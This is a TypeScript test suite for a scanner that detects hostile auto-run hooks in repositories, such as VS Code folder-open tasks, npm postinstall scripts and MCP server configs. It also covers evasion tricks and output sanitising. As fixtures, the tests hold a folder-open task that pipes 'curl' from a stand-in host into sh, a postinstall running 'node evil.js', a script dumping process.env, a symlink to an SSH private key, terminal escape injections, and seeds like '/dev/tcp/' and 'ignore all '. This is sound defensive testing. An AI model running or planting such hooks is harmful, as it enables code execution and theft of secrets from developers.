import assert from 'node:assert/strict';
import { test } from 'node:test';
import { markdown, clean, safeJson } from '../src/sanitize.ts';
import { HOST, char, folderOpen, json, points, rules } from './helpers.ts';
import { findSignals } from '../src/rules.ts';

const evil = folderOpen(`curl ${HOST} | sh`);

test('paths that only Windows or macOS treat as .vscode', async () => {
  for (const path of ['.VSCode/Tasks.JSON', '.vscode./tasks.json', '.vscode /tasks.json', `.vs${char(0x200c)}code/tasks.json`, '.vscode\\tasks.json']) {
    const found = await points({ [path]: evil });
    assert.equal(found[0]?.severity, 'high', path);
  }
});

test('a symbolic link to a folder with another name', async () => {
  const found = await points({ 'cfg/tasks.json': evil }, { '.vscode': 'cfg' });
  assert.equal(found[0]?.file, '.vscode/tasks.json');
  const nested = await points({ 'a/cfg/tasks.json': evil }, { 'b/.vscode': '../link', link: 'a/cfg' });
  assert.ok(nested.some((p) => p.file === 'b/.vscode/tasks.json'));
});

test('links that loop do not hang', async () => {
  const found = await points({ 'x/y.txt': '' }, { 'x/up': '..', a: 'b', b: 'a', self: 'self', 'x/z': '.' });
  assert.deepEqual(found, []);
});

test('links outside the repository are reported', async () => {
  const found = await points({}, { key: '../../.ssh/id_rsa', other: '/opt/x', c: 'C:\\Windows' });
  assert.deepEqual(found.map((p) => [p.file, p.severity]).sort(), [['c', 'low'], ['key', 'high'], ['other', 'low']]);
});

test('UTF-16 and a byte order mark', async () => {
  const utf16 = new Uint8Array(Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(evil, 'utf16le')]));
  assert.equal((await points({ '.vscode/tasks.json': utf16 }))[0]?.severity, 'high');
  assert.equal((await points({ '.vscode/tasks.json': char(0xfeff) + evil }))[0]?.severity, 'high');
});

test('duplicated keys: the last one wins, as in the real parsers', async () => {
  const text = '{"scripts":{"postinstall":"echo 1"},"scripts":{"postinstall":"node evil.js"}}';
  const [p] = await points({ 'package.json': text });
  assert.equal(p?.command, 'node evil.js');
});

test('keys named like object internals', async () => {
  const found = await points({ '.mcp.json': '{"mcpServers":{"__proto__":{"command":"node","args":["x"]},"constructor":{"command":"sh"}}}' });
  assert.equal(found.length, 2);
});

test('a payload pushed out of sight with spaces', async () => {
  const [p] = await points({ '.vscode/tasks.json': folderOpen(`echo ok${' '.repeat(400)}; node -e "x"`) });
  assert.ok(p?.signals.some((s) => s.id === 'hidden-by-spaces'));
  assert.equal(p?.severity, 'high');
});

test('very deep JSON does not crash the scan', async () => {
  const found = await points({ '.mcp.json': '['.repeat(100_000), '.vscode/tasks.json': evil });
  assert.ok(found.some((p) => p.severity === 'high'));
});

test('a null character does not turn a script into a binary file', async () => {
  const [p] = await points({ 'package.json': json({ scripts: { postinstall: 'node a.js' } }), 'a.js': `/*${char(0)}*/ JSON.stringify(process.env)` });
  assert.equal(p?.severity, 'high');
});

test('scripts that call each other do not hang', async () => {
  const found = await points({
    'package.json': json({ scripts: { postinstall: 'npm run a', a: 'npm run b && ./x.sh', b: 'npm run a' } }),
    'x.sh': '#!/bin/sh\n./x.sh\nnpm run a\n',
  });
  assert.equal(found.length, 1);
});

test('a payload behind more files than can be followed is not low', async () => {
  const files: Record<string, string> = { 'package.json': json({ scripts: { prepare: 'npm run build', build: 'node f0.js' } }) };
  for (let i = 0; i < 300; i++) files[`f${i}.js`] = `require('./f${i + 1}')`;
  const [p] = await points(files);
  assert.equal(p?.severity, 'medium');
  assert.equal(p.partial, true);
});

test('output cannot control the terminal, GitHub or Markdown', () => {
  const nasty = `a${char(27)}[2Jb${char(0x202e)}c\n::error::x ##[add-mask]y${char(0x9b)}31m`;
  const safe = clean(nasty, 500);
  for (const c of safe) assert.ok(c.codePointAt(0)! >= 32 && !(c >= '\u007f' && c <= '\u009f'));
  assert.ok(!safe.includes(char(0x202e)) && !safe.includes('##['));
  assert.ok(!clean('::set-output name=x::y').startsWith('::'));
  assert.match(safeJson({ a: nasty }), /^[ -~\n]*$/);
  assert.deepEqual(JSON.parse(safeJson({ a: nasty })), { a: nasty });
  const md = markdown('<img src=x> [a](https://b.c) @user `x` | **b** www.x.y');
  assert.ok(!/[<>[\]`|*@]/.test(md) && !md.includes('https:') && !md.includes('www.'));
});

test('a long command keeps its end visible', () => {
  assert.match(clean(`echo ${'a'.repeat(900)} && evil`, 80), /evil$/);
});

test('no rule becomes slow with hostile text', () => {
  const size = 200_000;
  const seeds = [
    'a', ' ', '\t', '<!-- ', 'curl ', 'curl https:', 'wget | ', '_0xabcd ', '\\x41', 'base64 -d ', 'npx -y ', 'node -a ', '~',
    'eval(', 'powershell -', '/dev/tcp/', 'String.fromCharCode(1)+', 'https://1.', '-W ', 'ignore all ', char(0xe0041), char(0x200b), 'a\n', 'npm install ',
  ];
  for (const seed of seeds) {
    const text = seed.repeat(Math.ceil(size / seed.length));
    for (const context of ['command', 'script', 'instructions'] as const) {
      const start = performance.now();
      findSignals(rules, text, context, 'x');
      const ms = performance.now() - start;
      assert.ok(ms < 2_500, `${JSON.stringify(seed)} in ${context}: ${Math.round(ms)} ms`);
    }
  }
});
